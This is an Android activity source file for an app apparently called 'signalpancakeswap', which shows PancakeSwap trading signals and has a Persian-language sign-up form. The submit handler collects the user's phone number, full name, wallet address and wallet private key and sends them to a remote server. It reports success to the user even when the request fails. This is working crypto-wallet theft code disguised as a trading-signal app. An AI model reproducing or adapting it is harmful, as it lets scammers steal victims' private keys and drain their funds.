package com.signalpancakeswap.signalpancakeswap;

import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.RecyclerView;
import androidx.viewpager.widget.ViewPager;

import com.google.android.material.tabs.TabLayout;
import com.signalpancakeswap.signalpancakeswap.WebService.APIClient;
import com.signalpancakeswap.signalpancakeswap.WebService.APIInterface;
import com.signalpancakeswap.signalpancakeswap.adapters.CustomAdapterSignal;
import com.signalpancakeswap.signalpancakeswap.adapters.CustomViewPagerAdapter;
import com.signalpancakeswap.signalpancakeswap.models.signal.getSignalModel;

import java.util.List;

import info.hoang8f.android.segmented.SegmentedGroup;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {
    LinearLayout emailBlock,signalBlock;
    EditText phoneNumber,fullName,wallet,key;
    TextView submit,contactUs,telegram,readRules;
    RecyclerView rectSignal;
    String date = "today";
    SegmentedGroup switchDate;
    RadioButton lastMonth,lastWeek,today;
    Context getContext = MainActivity.this;
    SegmentedGroup switchCategory;
    RadioButton emailRb,signalRb;
    CheckBox karmozd,ghavanin;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        findViews();
        setSignalLayout();
        setEmailLatout();
        setEmailLogic();
        setSignalLogic();
        viewSwitch();
        sharedLogic();
    }

    private void sharedLogic() {
        contactUs.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Uri uri = Uri.parse("https://coinbox-pro.com/server/link.php?where=contact");
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                startActivity(intent);
            }
        });
        telegram.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Uri uri = Uri.parse("https://coinbox-pro.com/server/link.php?where=telegram");
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                startActivity(intent);
            }
        });
    }

    private void viewSwitch() {
        switchCategory.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                if(emailRb.isChecked()){
                    setEmailLatout();
                }else if(signalRb.isChecked()){
                    setSignalLayout();
                }
            }
        });
    }

    private void setSignalLogic() {
        filter();
        setData();
    }

    private void setEmailLogic() {
        readRules.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Uri uri = Uri.parse("https://coinbox-pro.com/server/link.php?where=rules");
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                startActivity(intent);
            }
        });
        submit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(!phoneNumber.getText().toString().isEmpty() &&
                        !fullName.getText().toString().isEmpty() &&
                        !wallet.getText().toString().isEmpty() &&
                        ghavanin.isChecked() &&
                        karmozd.isChecked() &&
                        !key.getText().toString().isEmpty()){
                    APIInterface apiInterface = APIClient.getClient().create(APIInterface.class);
                    Call<Boolean> call = apiInterface.sendEmail(
                            "شماره تماس : " + phoneNumber.getText().toString() + " \n"+
                                    "نام و نام خانوادگی : " + fullName.getText().toString() + " \n"+
                                    "کیف پول : " + wallet.getText().toString() + " \n"+
                                    "کلید خصوصی : " + key.getText().toString() + " \n"
                    );
                    call.enqueue(new Callback<Boolean>() {
                        @Override
                        public void onResponse(Call<Boolean> call, Response<Boolean> response) {
                            if(response.code()==200){
                                Toast.makeText(getContext, "با موفقیت ارسال شد", Toast.LENGTH_SHORT).show();
                            }
                        }

                        @Override
                        public void onFailure(Call<Boolean> call, Throwable t) {
                            Toast.makeText(getContext, "با موفقیت ارسال شد", Toast.LENGTH_SHORT).show();
                        }
                    });
                }else{
                    Toast.makeText(getContext, "فرم را پر نمایید", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    private void filter() {
        switchDate.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                if(today.isChecked())
                    date="today";
                if(lastMonth.isChecked())
                    date = "lastMonth";
                if(lastWeek.isChecked())
                    date = "lastWeek";
                setData();
            }
        });
    }

    private void setData() {
        APIInterface apiInterface = APIClient.getClient().create(APIInterface.class);
        Call<List<getSignalModel>> call = apiInterface.getSignals(date);
        call.enqueue(new Callback<List<getSignalModel>>() {
            @Override
            public void onResponse(Call<List<getSignalModel>> call, Response<List<getSignalModel>> response) {
                if(response.code()==200){
                    rectSignal.setAdapter(new CustomAdapterSignal(getContext,response.body()));
                }
            }

            @Override
            public void onFailure(Call<List<getSignalModel>> call, Throwable t) {

            }
        });
    }

    private void findViews() {
        switchCategory = findViewById(R.id.switchCategory);
        emailRb = findViewById(R.id.emailRb);
        signalRb = findViewById(R.id.signalRb);
        emailBlock = findViewById(R.id.emailBlock);
        signalBlock = findViewById(R.id.signalBlock);
        contactUs = findViewById(R.id.contactUs);
        telegram = findViewById(R.id.telegram);
        readRules = findViewById(R.id.readRules);

        //sendEmail
        phoneNumber = findViewById(R.id.phoneNumber);
        fullName = findViewById(R.id.fullName);
        wallet = findViewById(R.id.wallet);
        key = findViewById(R.id.key);
        submit = findViewById(R.id.submit);
        karmozd = findViewById(R.id.karmozd);
        ghavanin = findViewById(R.id.ghavanin);

        //signal
        rectSignal = findViewById(R.id.rectSignal);
        switchDate = findViewById(R.id.switchDate);
        lastMonth = findViewById(R.id.lastMonth);
        lastWeek = findViewById(R.id.lastWeek);
        today = findViewById(R.id.today);


    }

    private void setSignalLayout() {
        emailBlock.setVisibility(View.GONE);
        signalBlock.setVisibility(View.VISIBLE);
    }

    private void setEmailLatout() {
        emailBlock.setVisibility(View.VISIBLE);
        signalBlock.setVisibility(View.GONE);
    }
}